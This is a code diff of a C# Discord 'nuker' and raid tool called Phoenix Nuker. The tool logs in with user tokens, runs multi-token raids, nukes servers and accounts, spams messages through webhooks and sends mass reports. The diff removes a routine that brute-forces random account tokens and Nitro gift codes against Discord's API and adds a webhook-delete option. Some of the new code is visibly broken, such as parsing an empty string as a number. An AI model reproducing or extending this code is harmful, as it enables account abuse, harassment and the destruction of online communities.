@@ -1,23 +1,23 @@
 ﻿using System;
+using Leaf.xNet;
 using System.IO;
 using System.Net;
-using System.Threading;
-using Leaf.xNet;
-using Newtonsoft.Json;
-using System.Drawing;
-using Console = Colorful.Console;
-using System.Net.Http;
-using System.Diagnostics;
-using System.Reflection;
-using Org.BouncyCastle.Crypto.Modes;
-using Org.BouncyCastle.Crypto.Parameters;
 using System.Linq;
-using System.Security.Cryptography;
-using Org.BouncyCastle.Crypto.Engines;
 using System.Text;
-using System.Text.RegularExpressions;
-using System.Collections.Generic;
+using System.Drawing;
+using Newtonsoft.Json;
+using System.Net.Http;
+using System.Threading;
+using System.Reflection;
+using System.Diagnostics;
 using BetterConsoleTables;
+using System.Collections.Generic;
+using Console = Colorful.Console;
+using System.Security.Cryptography;
+using Org.BouncyCastle.Crypto.Modes;
+using System.Text.RegularExpressions;
+using Org.BouncyCastle.Crypto.Engines;
+using Org.BouncyCastle.Crypto.Parameters;
 
 /* 
        │ Author       : extatent
@@ -30,34 +30,33 @@ namespace nuker
     class Program
     {
         #region Configs
-        public static string version = "7";
+        public static string version = "8";
         public static string token;
-        public static int WaitTimeLong = 2000;
 
-        class config
+        class Config
         {
-            public string token { get; set; }
+            public string Token { get; set; }
         }
 
         static void GetConfig()
         {
             StreamReader read = new StreamReader("config.json");
             string json = read.ReadToEnd();
-            config config = JsonConvert.DeserializeObject<config>(json);
-            token = config.token;
+            Config config = JsonConvert.DeserializeObject<Config>(json);
+            token = config.Token;
             read.Close();
         }
 
         static void SaveConfig(string token)
         {
-            config config = new config { token = token };
+            Config config = new Config { Token = token };
             var response = config;
-            string jsonData = JsonConvert.SerializeObject(response);
-            File.WriteAllText("config.json", jsonData);
+            string json = JsonConvert.SerializeObject(response);
+            File.WriteAllText("config.json", json);
         }
 
-        static List<string> clients = new List<string>();
-        static string guildid;
+        static readonly List<string> clients = new List<string>();
+        static ulong guildid;
         #endregion
 
         #region Write Logo, Write Line
@@ -71,7 +70,7 @@ namespace nuker
                                   ██████╔╝███████║██║   ██║█████╗  ██╔██╗ ██║██║ ╚███╔╝ 
                                   ██╔═══╝ ██╔══██║██║   ██║██╔══╝  ██║╚██╗██║██║ ██╔██╗ 
 " + " > GitHub: github.com/extatent" + @"    ██║     ██║  ██║╚██████╔╝███████╗██║ ╚████║██║██╔╝ ██╗
-                                  ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═══╝╚═╝╚═╝  ╚═╝
+" + " > Discord: dsc.gg/extatent " + @"      ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═══╝╚═╝╚═╝  ╚═╝
                                                       ";
             Console.WriteWithGradient(phoenix, Color.OrangeRed, Color.Yellow, 16);
             Console.WriteLine();
@@ -153,11 +152,18 @@ namespace nuker
             }
 
             GetConfig();
+            Login();
+        }
+        #endregion
 
+        #region Login
+        static void Login()
+        {
             try
             {
+                WriteLogo();
                 ColumnHeader[] headers = new[] { new ColumnHeader("##", Alignment.Left), new ColumnHeader("Choice", Alignment.Left), new ColumnHeader("##", Alignment.Left), new ColumnHeader("Choice", Alignment.Left) };
-                Table table = new Table(headers).AddRow("01", "Login With Config Token", "04", "Fetch User IDs").AddRow("02", "Login With DiscordApp Token", "05", "Token & Nitro Generator").AddRow("03", "Multi Token Raider", "06", "Exit");
+                Table table = new Table(headers).AddRow("01", "Login With Config Token", "04", "Fetch User IDs").AddRow("02", "Login With DiscordApp Token", "05", "Delete Webhook").AddRow("03", "Multi Token Raider", "06", "Exit");
                 table.Config = TableConfiguration.Unicode();
                 Console.Write(table.ToString());
                 Console.WriteLine();
@@ -168,9 +174,9 @@ namespace nuker
                 {
                     default:
                         Console.WriteLine("Not a valid option.");
-                        Thread.Sleep(WaitTimeLong);
+                        Thread.Sleep(2000);
                         Console.Clear();
-                        Start();
+                        Login();
                         break;
                     case 1:
                         if (string.IsNullOrEmpty(token))
@@ -180,24 +186,24 @@ namespace nuker
                                 Console.Clear();
                                 WriteLogo();
                                 Console.Write("Token: ");
-                                string t0ken = Console.ReadLine();
+                                string Token = Console.ReadLine();
 
-                                if (t0ken.Contains("\""))
+                                if (Token.Contains("\""))
                                 {
-                                    t0ken = t0ken.Replace("\"", "");
+                                    Token = Token.Replace("\"", "");
                                 }
-                                if (t0ken.Contains("'"))
+                                if (Token.Contains("'"))
                                 {
-                                    t0ken = t0ken.Replace("'", "");
+                                    Token = Token.Replace("'", "");
                                 }
 
-                                SaveConfig(t0ken);
-                                token = t0ken;
+                                SaveConfig(Token);
+                                token = Token;
                             }
                             catch (Exception ex)
                             {
                                 Console.WriteLine(ex.Message);
-                                Thread.Sleep(WaitTimeLong);
+                                Thread.Sleep(2000);
                                 if (File.Exists("config.json"))
                                 {
                                     File.Delete("config.json");
@@ -214,7 +220,7 @@ namespace nuker
                         catch (Exception ex)
                         {
                             Console.WriteLine(ex.Message);
-                            Thread.Sleep(WaitTimeLong);
+                            Thread.Sleep(2000);
                             Start();
                         }
                         break;
@@ -231,8 +237,8 @@ namespace nuker
                             Console.Clear();
                             WriteLogo();
                             Console.WriteLine("Paste your tokens in tokens.txt file.");
-                            Thread.Sleep(WaitTimeLong);
-                            Start();
+                            Thread.Sleep(2000);
+                            Login();
                         }
                         Console.Title = "Phoenix Nuker | Total Accounts: " + count;
                         Raider();
@@ -245,20 +251,36 @@ namespace nuker
                         var ids = File.ReadAllLines("serverids.txt");
                         foreach (string id in ids)
                         {
-                            Server.GetIDs(token, id);
+                            Server.GetIDs(token, ulong.Parse(id));
                         }
                         if (string.IsNullOrEmpty(File.ReadAllText("serverids.txt")))
                         {
                             Console.Clear();
                             WriteLogo();
                             Console.WriteLine("Paste server IDs in serverids.txt file.");
-                            Thread.Sleep(WaitTimeLong);
-                            Start();
+                            Thread.Sleep(2000);
+                            Login();
                         }
-                        Start();
+                        Login();
                         break;
                     case 5:
-                        Generator();
+                        Console.Clear();
+                        WriteLogo();
+                        try
+                        {
+                            Console.Write("Webhook URL/ID: ");
+                            ulong wid = ulong.Parse(Console.ReadLine());
+                            Console.Clear();
+                            WriteLogo();
+                            Server.DeleteWebhook(token, wid);
+                        }
+                        catch (Exception ex)
+                        {
+                            Console.WriteLine(ex.Message);
+                            Thread.Sleep(2000);
+                            Login();
+                        }
+                        Login();
                         break;
                     case 6:
                         Environment.Exit(0);
@@ -268,156 +290,12 @@ namespace nuker
             catch (Exception ex)
             {
                 Console.WriteLine(ex.Message);
-                Thread.Sleep(WaitTimeLong);
+                Thread.Sleep(2000);
                 Start();
             }
 
             WriteLogo();
             Options();
-        }
-        #endregion
-
-        #region Token & Nitro Generator
-        private static Random random = new Random();
-
-        public static string GenString(int length)
-        {
-            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";
-            return new string(Enumerable.Repeat(chars, length).Select(s => s[random.Next(s.Length)]).ToArray());
-        }
-
-        static void Generator()
-        {
-            try
-            {
-                GetConfig();
-                Console.Clear();
-                WriteLogo();
-                ColumnHeader[] headers = new[] { new ColumnHeader("##", Alignment.Left), new ColumnHeader("Choice", Alignment.Left), new ColumnHeader("##", Alignment.Left), new ColumnHeader("Choice", Alignment.Left) };
-                Table table = new Table(headers).AddRow("01", "Token Generator", "03", "Go Back").AddRow("02", "Nitro Generator", "04", "Exit");
-                table.Config = TableConfiguration.Unicode();
-                Console.Write(table.ToString());
-                Console.WriteLine();
-                Console.WriteLine();
-                Console.Write("Your choice: ");
-                int option = Convert.ToInt32(Console.ReadLine());
-                switch (option)
-                {
-                    default:
-                        Console.WriteLine("Not a valid option.");
-                        Thread.Sleep(WaitTimeLong);
-                        Console.Clear();
-                        Generator();
-                        break;
-                    case 1:
-                        try
-                        {
-                            Console.Clear();
-                            WriteLogo();
-                            Console.Write("Count: ");
-                            string count = Console.ReadLine();
-                            Console.Clear();
-                            WriteLogo();
-                            if (!File.Exists("tokens.txt"))
-                            {
-                                File.Create("tokens.txt").Dispose();
-                            }
-                            Console.ReplaceAllColorsWithDefaults();
-                            for (int i = 0; i < int.Parse(count); i++)
-                            {
-                                string token = string.Format("{0}.{1}.{2}", GenString(24), GenString(6), GenString(38));
-                                try
-                                {
-                                    HttpRequest request = new HttpRequest();
-                                    request.AddHeader("Authorization", token);
-                                    request.Get($"https://discord.com/api/v{Config.APIVersion}/users/@me");
-                                    request.Close();
-                                    Console.WriteLine(token, Color.Lime);
-                                    File.AppendAllText("valid.txt", token + Environment.NewLine);
-                                }
-                                catch
-                                {
-                                    Console.WriteLine(token, Color.Red);
-                                }
-                            }
-                        }
-                        catch (Exception ex)
-                        {
-                            Console.WriteLine(ex.Message);
-                            Thread.Sleep(WaitTimeLong);
-                        }
-                        Console.WriteLine();
-                        Console.WriteLine("Done. The valid tokens were saved to tokens.txt");
-                        Thread.Sleep(2000);
-                        Generator();
-                        break;
-                    case 2:
-                        try
-                        {
-                            Console.Clear();
-                            WriteLogo();
-                            Console.WriteLine("You must have a valid token added in the config.json (for the checker)");
-                            Console.WriteLine();
-                            Console.Write("Count: ");
-                            string count = Console.ReadLine();
-                            Console.Clear();
-                            WriteLogo();
-                            if (!File.Exists("nitro.txt"))
-                            {
-                                File.Create("nitro.txt").Dispose();
-                            }
-                            Console.ReplaceAllColorsWithDefaults();
-                            for (int i = 0; i < int.Parse(count); i++)
-                            {
-                                string code = string.Format("{0}", GenString(16));
-                                try
-                                {
-                                    HttpRequest request = new HttpRequest();
-                                    try
-                                    {
-                                        request.AddHeader("Authorization", token);
-                                    }
-                                    catch
-                                    {
-                                        request.AddHeader("Authorization", GetToken());
-                                    }
-                                    request.Get($"https://discord.com/api/v{Config.APIVersion}/entitlements/gift-codes/{code}?with_application=false&with_subscription_plan=true");
-                                    request.Close();
-                                    Console.WriteLine("https://discord.gift/" + code, Color.Lime);
-                                    File.AppendAllText("valid.txt", "https://discord.gift/" + code + Environment.NewLine);
-                                }
-                                catch
-                                {
-                                    Console.WriteLine("https://discord.gift/" + code, Color.Red);
-                                }
-                            }
-                        }
-                        catch (Exception ex)
-                        {
-                            Console.WriteLine(ex.Message);
-                            Thread.Sleep(WaitTimeLong);
-                        }
-                        Console.WriteLine();
-                        Console.WriteLine("Done. The valid codes were saved to nitro.txt");
-                        Thread.Sleep(2000);
-                        Generator();
-                        break;
-                    case 3:
-                        Console.Clear();
-                        WriteLogo();
-                        Start();
-                        break;
-                    case 4:
-                        Environment.Exit(0);
-                        break;
-                }
-            }
-            catch (Exception ex)
-            {
-                Console.WriteLine(ex.Message);
-                Thread.Sleep(WaitTimeLong);
-                Generator();
-            }
         }
         #endregion
 
@@ -460,10 +338,10 @@ namespace nuker
                         WriteLogo();
                         try
                         {
-                            if (string.IsNullOrEmpty(guildid))
+                            if (string.IsNullOrEmpty(guildid.ToString()))
                             {
                                 Console.Write("Guild ID: ");
-                                string GuildID = Console.ReadLine();
+                                ulong GuildID = ulong.Parse(Console.ReadLine());
                                 guildid = GuildID;
                             }
                             if (Server.GetServerName(token, guildid) == "N/A")
@@ -471,8 +349,8 @@ namespace nuker
                                 Console.Clear();
                                 WriteLogo();
                                 Console.WriteLine("Invalid ID or you're not in the server.");
-                                guildid = "";
-                                Thread.Sleep(WaitTimeLong);
+                                guildid = ulong.Parse("");
+                                Thread.Sleep(2000);
                                 Options();
                             }
                             Console.Title = $"Phoenix Nuker | {User.GetUsername(token)} | {Server.GetServerName(token, guildid)}";
@@ -518,7 +396,7 @@ namespace nuker
                             HttpRequest httpRequest = new HttpRequest();
                             httpRequest.Authorization = token;
                             httpRequest.UserAgentRandomize();
-                            string url = $"https://discord.com/api/v{Config.APIVersion}/report";
+                            string url = $"https://discord.com/api/v{nuker.Config.APIVersion}/report";
 
                             string jsonData = string.Concat(new string[]
                             {
@@ -584,7 +462,7 @@ namespace nuker
                                     Webhook hook = new Webhook(webhook);
                                     hook.SendMessage(message);
                                     Console.WriteLine("Messages sent: " + total);
-                                    Thread.Sleep(WaitTimeLong);
+                                    Thread.Sleep(2000);
                                 }
                                 catch { }
                             }
@@ -611,7 +489,7 @@ namespace nuker
             catch (Exception ex)
             {
                 Console.WriteLine(ex.Message);
-                Thread.Sleep(WaitTimeLong);
+                Thread.Sleep(2000);
                 Options();
             }
         }
@@ -644,7 +522,7 @@ namespace nuker
         static void DoneMethod()
         {
             Console.WriteLine("Done");
-            Thread.Sleep(WaitTimeLong);
+            Thread.Sleep(2000);
             Console.Clear();
             AccountNuker();
         }
@@ -652,7 +530,7 @@ namespace nuker
         static void DoneMethod2()
         {
             Console.WriteLine("Done");
-            Thread.Sleep(WaitTimeLong);
+            Thread.Sleep(2000);
             Console.Clear();
             ServerNuker();
         }
@@ -660,14 +538,14 @@ namespace nuker
         static void DoneMethod3()
         {
             Console.WriteLine("Done");
-            Thread.Sleep(WaitTimeLong);
+            Thread.Sleep(2000);
             Console.Clear();
             Options();
         }
 
         static void DoneMethod4()
         {
-            Thread.Sleep(WaitTimeLong);
+            Thread.Sleep(2000);
             Console.Clear();
             Options();
         }
@@ -675,7 +553,7 @@ namespace nuker
         static void DoneMethod5()
         {
             Console.WriteLine("Done");
-            Thread.Sleep(WaitTimeLong);
+            Thread.Sleep(2000);
             Console.Clear();
             Raider();
         }
@@ -701,7 +579,7 @@ namespace nuker
                 {
                     default:
                         Console.WriteLine("Not a valid option.");
-                        Thread.Sleep(WaitTimeLong);
+                        Thread.Sleep(2000);
                         Console.Clear();
                         Raider();
                         break;
@@ -731,7 +609,7 @@ namespace nuker
                         catch (Exception ex)
                         {
                             Console.WriteLine(ex.Message);
-                            Thread.Sleep(WaitTimeLong);
+                            Thread.Sleep(2000);
                         }
                         Raider();
                         break;
@@ -753,7 +631,7 @@ namespace nuker
                         catch (Exception ex)
                         {
                             Console.WriteLine(ex.Message);
-                            Thread.Sleep(WaitTimeLong);
+                            Thread.Sleep(2000);
                         }
                         Raider();
                         break;
@@ -777,7 +655,7 @@ namespace nuker
                         catch (Exception ex)
                         {
                             Console.WriteLine(ex.Message);
-                            Thread.Sleep(WaitTimeLong);
+                            Thread.Sleep(2000);
                         }
                         Raider();
                         break;
@@ -810,7 +688,7 @@ namespace nuker
                         catch (Exception ex)
                         {
                             Console.WriteLine(ex.Message);
-                            Thread.Sleep(WaitTimeLong);
+                            Thread.Sleep(2000);
                         }
                         Raider();
                         break;
@@ -912,7 +790,7 @@ namespace nuker
                         catch (Exception ex)
                         {
                             Console.WriteLine(ex.Message);
-                            Thread.Sleep(WaitTimeLong);
+                            Thread.Sleep(2000);
                         }
                         Raider();
                         break;
@@ -942,7 +820,7 @@ namespace nuker
                         catch (Exception ex)
                         {
                             Console.WriteLine(ex.Message);
-                            Thread.Sleep(WaitTimeLong);
+                            Thread.Sleep(2000);
                         }
                         Raider();
                         break;
@@ -964,7 +842,7 @@ namespace nuker
                         catch (Exception ex)
                         {
                             Console.WriteLine(ex.Message);
-                            Thread.Sleep(WaitTimeLong);
+                            Thread.Sleep(2000);
                         }
                         Raider();
                         break;
@@ -990,7 +868,7 @@ namespace nuker
                         catch (Exception ex)
                         {
                             Console.WriteLine(ex.Message);
-                            Thread.Sleep(WaitTimeLong);
+                            Thread.Sleep(2000);
                         }
                         Raider();
                         break;
@@ -1012,7 +890,7 @@ namespace nuker
                         catch (Exception ex)
                         {
                             Console.WriteLine(ex.Message);
-                            Thread.Sleep(WaitTimeLong);
+                            Thread.Sleep(2000);
                         }
                         Raider();
                         break;
@@ -1034,7 +912,7 @@ namespace nuker
                         catch (Exception ex)
                         {
                             Console.WriteLine(ex.Message);
-                            Thread.Sleep(WaitTimeLong);
+                            Thread.Sleep(2000);
                         }
                         Raider();
                         break;
@@ -1050,7 +928,7 @@ namespace nuker
             catch (Exception ex)
             {
                 Console.WriteLine(ex.Message);
-                Thread.Sleep(WaitTimeLong);
+                Thread.Sleep(2000);
                 Raider();
             }
         }
@@ -1073,7 +951,7 @@ namespace nuker
             {
                 default:
                     Console.WriteLine("Not a valid option.");
-                    Thread.Sleep(WaitTimeLong);
+                    Thread.Sleep(2000);
                     Console.Clear();
                     AccountNuker();
                     break;
@@ -1241,7 +1119,7 @@ namespace nuker
             {
                 default:
                     Console.WriteLine("Not a valid option.");
-                    Thread.Sleep(WaitTimeLong);
+                    Thread.Sleep(2000);
                     Console.Clear();
                     ServerNuker();
                     break;
@@ -1363,7 +1241,7 @@ namespace nuker
                     catch (Exception ex)
                     {
                         Console.WriteLine(ex.Message);
-                        Thread.Sleep(WaitTimeLong);
+                        Thread.Sleep(2000);
                     }
                     DoneMethod2();
                     break;
@@ -1388,7 +1266,7 @@ namespace nuker
                     catch 
                     {
                         Console.WriteLine("Wrong response");
-                        Thread.Sleep(WaitTimeLong);
+                        Thread.Sleep(2000);
                     }
                     break;
                 case 13:
@@ -1441,7 +1319,7 @@ namespace nuker
                     catch (Exception ex)
                     {
                         Console.WriteLine(ex.Message);
-                        Thread.Sleep(WaitTimeLong);
+                        Thread.Sleep(2000);
                     }
                     DoneMethod2();
                     break;
@@ -1465,7 +1343,7 @@ namespace nuker
                     catch (Exception ex)
                     {
                         Console.WriteLine(ex.Message);
-                        Thread.Sleep(WaitTimeLong);
+                        Thread.Sleep(2000);
                     }
                     break;
                 case 16:
